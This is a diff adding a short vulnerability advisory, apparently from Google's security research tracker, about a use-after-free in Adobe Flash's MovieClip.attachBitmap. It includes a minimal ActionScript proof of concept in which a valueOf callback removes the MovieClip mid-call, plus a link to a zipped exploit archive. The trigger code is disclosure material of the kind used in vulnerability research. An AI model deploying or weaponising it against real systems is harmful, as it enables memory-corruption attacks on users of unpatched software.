@@ -1,0 +1,25 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=593
+
+There is a use-after-free in MovieClip.attachBitmap. If the depth parameter is an object with valueOf defined, this method can free the MovieClip, which is then used.
+
+A minimal PoC follows:
+
+this.createEmptyMovieClip("mc", 1);
+var b = new flash.display.BitmapData(100, 100, true, 0x77777777);
+mc.attachBitmap( b, {valueOf : func });
+
+function func(){
+	
+	mc.removeMovieClip();
+	
+        // Fix heap here
+
+        return 5;
+	
+	}
+	
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39040.zip
+
